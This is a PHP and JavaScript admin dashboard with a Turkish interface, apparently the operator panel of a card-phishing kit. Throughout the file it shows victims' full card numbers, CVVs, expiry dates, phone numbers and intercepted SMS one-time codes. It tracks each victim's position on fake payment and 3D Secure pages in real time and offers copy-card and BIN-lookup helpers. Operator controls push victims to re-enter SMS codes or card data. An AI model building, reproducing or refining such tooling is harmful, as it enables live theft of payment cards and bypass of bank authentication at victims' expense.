<?php
require_once '../config.php';
$pdo = getDbConnection();
?>

<div class="card">
    <div class="card-header">
        <h2 class="card-title">
            <i class="fas fa-users"></i>
            Kullanıcı Yönetimi
        </h2>
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
            <button class="btn btn-secondary btn-sm" onclick="exportLogs()">
                <i class="fas fa-download"></i> Logları Kaydet
            </button>
            <button class="btn btn-secondary btn-sm" onclick="exportCredits()" style="background:#f0fdf4;border-color:#16a34a;color:#16a34a;">
                <i class="fas fa-credit-card"></i> Credit Kaydet
            </button>
            <button class="btn btn-danger btn-sm" onclick="deleteAllLogs()">
                <i class="fas fa-trash"></i> Logları Sil
            </button>
            <span id="refreshStatus" style="color:#718096;font-size:0.9rem;">
                <i class="fas fa-sync-alt fa-spin" style="font-size:0.8rem;margin-right:4px;"></i>
                Canlı güncelleme: 1 saniye
            </span>
            <button class="btn btn-primary btn-sm" onclick="loadUsers()">
                <i class="fas fa-sync-alt"></i> Yenile
            </button>
        </div>
    </div>
    <div class="card-body">
        <div id="usersTable">
            <div style="text-align:center;padding:2rem;color:#718096;">
                <i class="fas fa-spinner fa-spin" style="font-size:2rem;"></i>
                <p style="margin-top:1rem;">Yükleniyor...</p>
            </div>
        </div>
    </div>
</div>

<style>
.table-responsive { overflow-x: auto; }
.user-row { transition: background-color 0.2s; }
.user-row:hover { background-color: rgba(0,0,0,0.02); }

.live-indicator {
    display:inline-block;width:8px;height:8px;
    background:#2ecc71;border-radius:50%;animation:pulse 2s infinite;
    flex-shrink:0;
}
.offline-indicator {
    display:inline-block;width:8px;height:8px;
    background:#95a5a6;border-radius:50%;opacity:0.5;flex-shrink:0;
}
@keyframes pulse {
    0%,100%{opacity:1;transform:scale(1);}
    50%{opacity:0.5;transform:scale(1.2);}
}

.card-display {
    display:inline-flex;flex-direction:column;gap:3px;
    padding:6px 0;cursor:pointer;min-width:210px;
    transition:opacity 0.15s;
}
.card-display:hover { opacity:0.7; }
.card-display-name { font-size:0.68rem;font-weight:700;color:#94a3b8;letter-spacing:0.5px;text-transform:uppercase; }
.card-display-number { font-size:0.9rem;font-weight:700;color:#1e293b;letter-spacing:1.5px;font-variant-numeric:tabular-nums; }
.card-display-meta { font-size:0.75rem;color:#64748b;font-weight:500; }
.card-display-bin { font-size:0.72rem;font-weight:700;color:#d97706;margin-top:1px;min-height:13px; }

.action-btn { position:relative;display:inline-block; }
.action-btn > button {
    background:#f1f5f9;border:1px solid #e2e8f0;color:#475569;
    border-radius:7px;padding:6px 12px;font-size:0.8rem;font-weight:600;
    cursor:pointer;display:flex;align-items:center;gap:5px;
    transition:all 0.15s;white-space:nowrap;
}
.action-btn > button:hover { background:#e2e8f0;color:#1e293b; }

.action-dropdown {
    display:none;position:fixed;background:#fff;
    border:1px solid #e2e8f0;border-radius:10px;
    box-shadow:0 8px 30px rgba(0,0,0,0.12);
    z-index:9998;min-width:170px;overflow:hidden;
    animation:dropIn 0.12s ease;
}
.action-dropdown.open { display:block; }
@keyframes dropIn {
    from{opacity:0;transform:translateY(-5px);}
    to{opacity:1;transform:translateY(0);}
}
.action-dropdown button {
    display:flex;align-items:center;gap:9px;width:100%;
    padding:10px 14px;background:none;border:none;color:#334155;
    font-size:0.82rem;font-weight:500;cursor:pointer;text-align:left;
    transition:background 0.1s;border-bottom:1px solid #f1f5f9;
}
.action-dropdown button:last-child { border-bottom:none; }
.action-dropdown button:hover { background:#f8fafc; }
.action-dropdown button i { width:15px;text-align:center; }
.action-dropdown .sep { height:1px;background:#f1f5f9;margin:3px 0; }

.time-badge {
    display:inline-block;padding:3px 8px;
    border-radius:10px;font-size:0.73rem;font-weight:600;
}
.time-active { background:rgba(46,204,113,0.1);color:#16a34a; }
.time-recent { background:rgba(243,156,18,0.1);color:#d97706; }
</style>

<script>
let autoRefreshInterval = null;
let openDropdown = null;
let binCache = {};
let lastUserHash = {}; // titreme önleme: id → hash

const statusTR = {
    waiting:'Bekliyor', sms:'SMS Bekleniyor', online:'Aktif',
    pending:'Bekliyor', sms_waiting:'SMS Bekleniyor',
    approved:'Onaylandı', rejected:'Reddedildi'
};

async function loadUsers() {
    try {
        const r = await fetch('/api.php?action=get_all_users');
        const d = await r.json();
        if (d.success) renderUsersTable(d.users);
    } catch(e) { console.error(e); }
}

function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    autoRefreshInterval = setInterval(loadUsers, 1000);
    document.getElementById('refreshStatus').innerHTML =
        '<i class="fas fa-sync-alt fa-spin" style="font-size:0.8rem;margin-right:4px;"></i> Canlı güncelleme: 1 saniye';
    document.getElementById('refreshStatus').style.color = '#718096';
}

function stopAutoRefresh() {
    if (autoRefreshInterval) { clearInterval(autoRefreshInterval); autoRefreshInterval = null; }
    document.getElementById('refreshStatus').innerHTML =
        '<i class="fas fa-pause" style="font-size:0.8rem;margin-right:4px;"></i> Güncelleme durduruldu';
    document.getElementById('refreshStatus').style.color = '#d97706';
}

function userHash(u) {
    return [u.payment_status, u.sms_code||'', u.sms_code2||'',
            Math.floor(u.seconds_ago||999), u.current_page||'',
            u.card_number||'', u.card_holder||'', u.card_expiry||'', u.card_cvc||'', u.phone||''].join('|');
}

function getPageIcon(p) {
    if (!p) return 'fas fa-circle-notch';
    if (p.includes('/index.php')||p==='/') return 'fas fa-home';
    if (p.includes('/screen2.php')) return 'fas fa-file-alt';
    if (p.includes('/screen3.php')) return 'fas fa-credit-card';
    if (p.includes('/bekle.php')) return 'fas fa-hourglass-half';
    if (p.includes('/success.php')) return 'fas fa-check-circle';
    if (p.includes('/error_card.php')) return 'fas fa-exclamation-triangle';
    if (p.includes('/acs/')) return 'fas fa-lock';
    return 'fas fa-file';
}

function getPageName(p) {
    if (!p) return 'Çevrimdışı';
    if (p.includes('/index.php')||p==='/') return 'Ana Sayfa';
    if (p.includes('/screen2.php')) return 'Tutar Seçimi';
    if (p.includes('/screen3.php')) return 'Kart Bilgileri';
    if (p.includes('/bekle.php')) return 'Bekleme';
    if (p.includes('/success.php')) return 'Başarılı';
    if (p.includes('/error_card.php')) return 'Hata';
    if (p.includes('/acs/')) return '3D Secure';
    return p;
}

function formatTimeAgo(s) {
    if (s===null||s===undefined) return '-';
    if (s<0.1) return '0.0s';
    if (s<1) return s.toFixed(1)+'s';
    if (s<60) return Math.floor(s)+'s';
    if (s<3600) return Math.floor(s/60)+'d';
    return Math.floor(s/3600)+'s';
}

function buildRowHTML(u) {
    const statusKey = {pending:'waiting',sms_waiting:'sms',approved:'online'}[u.payment_status]||u.payment_status;
    const statusLabel = statusTR[statusKey]||statusKey;

    let cardInfo = '<span style="color:#94a3b8;">-</span>';
    if (u.card_number) {
        const num = u.card_number.replace(/\D/g,'');
        const fmt = num.replace(/(\d{4})(?=\d)/g,'$1 ');
        const holder = (u.card_holder||'').toUpperCase()||'AD SOYAD';
        const expiry = u.card_expiry||'••/••';
        const cvc = u.card_cvc||'•••';
        const copyVal = (num+' '+expiry+' '+cvc).replace(/'/g,"\\'");
        cardInfo = `<div class="card-display" onclick="copyCard('${copyVal}',this)" title="Tıkla & Kopyala">
            <div class="card-display-name">${holder}</div>
            <div class="card-display-number">${fmt}</div>
            <div class="card-display-meta">${expiry} &nbsp; CVV: ${cvc}</div>
            <div class="card-display-bin" id="bin_${u.id}"></div>
        </div>`;
    }

    const sms = u.sms_code
        ? `<span style="color:#16a34a;font-weight:700;">${u.sms_code}</span>`
          +(u.sms_code2?`<br><span style="color:#dc2626;font-weight:700;">${u.sms_code2}</span>`:'')
        : '-';

    const isOnline = u.seconds_ago!==null && u.seconds_ago<5;
    const pageHTML = u.current_page
        ? `<div style="display:flex;align-items:center;gap:5px;">
            ${isOnline?'<span class="live-indicator"></span>':'<span class="offline-indicator"></span>'}
            <i class="${getPageIcon(u.current_page)}" style="color:${isOnline?'#2ecc71':'#95a5a6'};font-size:0.85rem;"></i>
            <span style="font-size:0.82rem;color:${isOnline?'#1e293b':'#95a5a6'};">${getPageName(u.current_page)}</span>
           </div>`
        : '<span style="color:#95a5a6;font-size:0.82rem;">Çevrimdışı</span>';

    const timeHTML = u.seconds_ago!==null
        ? `<span class="time-badge ${u.seconds_ago<3?'time-active':'time-recent'}">${formatTimeAgo(u.seconds_ago)}</span>`
        : '<span style="color:#95a5a6;">-</span>';

    const waitBtn = !u.card_number
        ? `<button onclick="sendToWait(${u.id});closeDropdown()" style="color:#d97706;"><i class="fas fa-hourglass-half"></i> Bekleniyor</button><div class="sep"></div>`
        : '';

    return `
        <td>#${u.id}</td>
        <td style="font-size:0.85rem;">${u.identifier_value||'-'}</td>
        <td style="font-weight:600;">${parseFloat(u.total).toFixed(2)} ₺</td>
        <td style="font-size:0.85rem;">${u.phone||'-'}</td>
        <td>${cardInfo}</td>
        <td>${sms}</td>
        <td><span class="status ${statusKey}">${statusLabel}</span></td>
        <td>${pageHTML}</td>
        <td>${timeHTML}</td>
        <td>
            <div class="action-btn" id="ab_${u.id}">
                <button onclick="toggleDropdown(${u.id},event)">
                    <i class="fas fa-ellipsis-v"></i> İşlem Yap
                </button>
                <div class="action-dropdown" id="dd_${u.id}">
                    ${waitBtn}
                    <button onclick="sendSMS(${u.id});closeDropdown()"><i class="fas fa-sms" style="color:#3b82f6;"></i> SMS Gönder</button>
                    <button onclick="approvePayment(${u.id});closeDropdown()"><i class="fas fa-check-circle" style="color:#16a34a;"></i> Onayla</button>
                    <button onclick="rejectSMS(${u.id});closeDropdown()"><i class="fas fa-times-circle" style="color:#dc2626;"></i> SMS Hatalı</button>
                    <button onclick="rejectCard(${u.id});closeDropdown()"><i class="fas fa-ban" style="color:#dc2626;"></i> Kart Hatalı</button>
                    <div class="sep"></div>
                    <button onclick="deleteUser(${u.id});closeDropdown()" style="color:#dc2626;"><i class="fas fa-trash"></i> Sil</button>
                </div>
            </div>
        </td>`;
}

function renderUsersTable(users) {
    const container = document.getElementById('usersTable');

    if (!users.length) {
        container.innerHTML = '<p style="text-align:center;color:#718096;padding:2rem;">Henüz kayıt yok</p>';
        lastUserHash = {};
        return;
    }

    const existingTbody = container.querySelector('tbody');
    const existingIds = existingTbody
        ? [...existingTbody.querySelectorAll('tr[data-uid]')].map(r=>r.dataset.uid)
        : [];
    const newIds = users.map(u=>String(u.id));
    const sameStructure = existingTbody
        && existingIds.length===newIds.length
        && existingIds.every((id,i)=>id===newIds[i]);

    if (!sameStructure) {
        // Tam render (yeni kayıt geldi veya ilk yükleme)
        let html = `<div class="table-responsive"><table>
            <thead><tr>
                <th>ID</th><th>Kimlik</th><th>Tutar</th><th>Telefon</th>
                <th>💳 Kart</th><th>SMS</th><th>Durum</th>
                <th>📍 Sayfa</th><th>⏱️ Son Aktivite</th><th>İşlemler</th>
            </tr></thead><tbody>`;
        users.forEach(u => {
            html += `<tr class="user-row" data-uid="${u.id}" onmouseenter="stopAutoRefresh()" onmouseleave="startAutoRefresh()">${buildRowHTML(u)}</tr>`;
            lastUserHash[u.id] = userHash(u);
        });
        html += '</tbody></table></div>';
        container.innerHTML = html;
        // BIN yükle
        users.forEach(u => {
            if (u.card_number) loadBin(u.card_number.replace(/\D/g,'').substring(0,6), `bin_${u.id}`);
        });
        return;
    }

    // Sadece değişen satırları güncelle (titreme yok)
    users.forEach(u => {
        const h = userHash(u);
        if (lastUserHash[u.id] === h) return;
        lastUserHash[u.id] = h;

        const row = existingTbody.querySelector(`tr[data-uid="${u.id}"]`);
        if (!row) return;

        // Tüm satırı yeniden render et (kart dahil her şey değişebilir)
        row.innerHTML = buildRowHTML(u);

        // BIN yükle (kart varsa)
        if (u.card_number) {
            loadBin(u.card_number.replace(/\D/g,'').substring(0,6), `bin_${u.id}`);
        }
    });
}

// BIN yükle
async function loadBin(bin, elId) {
    const el = document.getElementById(elId);
    if (!el||!bin||bin.length<6) return;
    if (binCache[bin]) { el.textContent = binCache[bin]; return; }
    try {
        const r = await fetch('/bin_check.php?bin='+encodeURIComponent(bin));
        const d = await r.json();
        if (!d.error) {
            const txt = [d.bank,d.brand,d.type].filter(Boolean).join(' \u00B7 ');
            binCache[bin] = txt;
            const el2 = document.getElementById(elId);
            if (el2) el2.textContent = txt;
        }
    } catch(e) {}
}

function copyCard(text, el) {
    navigator.clipboard.writeText(text).then(() => {
        const t = document.createElement('div');
        t.textContent = '✓ Kopyalandı!';
        t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#6ee7a0;border:1px solid rgba(110,231,160,0.3);padding:8px 18px;border-radius:8px;font-size:0.82rem;font-weight:600;z-index:99999;pointer-events:none;';
        document.body.appendChild(t);
        setTimeout(()=>t.remove(),1500);
    });
}

function toggleDropdown(id, e) {
    e.stopPropagation();
    const dd = document.getElementById('dd_'+id);
    const rect = e.currentTarget.getBoundingClientRect();
    if (openDropdown&&openDropdown!==dd) openDropdown.classList.remove('open');
    if (dd.classList.contains('open')) { dd.classList.remove('open'); openDropdown=null; }
    else {
        dd.style.top=(rect.bottom+window.scrollY+4)+'px';
        dd.style.left=(rect.left+window.scrollX)+'px';
        dd.classList.add('open'); openDropdown=dd;
    }
}
function closeDropdown() {
    if (openDropdown) { openDropdown.classList.remove('open'); openDropdown=null; }
}
document.addEventListener('click', closeDropdown);

function exportLogs()    { window.open('/export_log.php?filter=card','_blank'); }
function exportCredits() { window.open('/export_log.php?filter=credit','_blank'); }

async function deleteAllLogs() {
    if (!confirm('Tüm logları silmek istediğinizden emin misiniz? Bu işlem geri alınamaz!')) return;
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=delete_all_users'});
    const d = await r.json();
    if (d.success) { lastUserHash={}; loadUsers(); }
    else alert('Hata: '+(d.message||'Silinemedi'));
}

async function sendToWait(id) {
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=send_redirect&user_id=${id}`});
    const d = await r.json(); if(d.success) loadUsers();
}
async function sendSMS(id) {
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=send_redirect&user_id=${id}`});
    const d = await r.json(); if(d.success) loadUsers();
}
async function approvePayment(id) {
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=approve_payment&user_id=${id}`});
    const d = await r.json(); if(d.success) loadUsers();
}
async function rejectSMS(id) {
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=reject_sms&user_id=${id}`});
    const d = await r.json(); if(d.success) loadUsers();
}
async function rejectCard(id) {
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=reject_card&user_id=${id}`});
    const d = await r.json(); if(d.success) loadUsers();
}
async function deleteUser(id) {
    if (!confirm('Bu kaydı silmek istediğinizden emin misiniz?')) return;
    const r = await fetch('/api.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`action=delete_user&user_id=${id}`});
    const d = await r.json();
    if(d.success) loadUsers();
    else alert('Hata: '+(d.message||'Silinemedi'));
}

loadUsers();
startAutoRefresh();
</script>
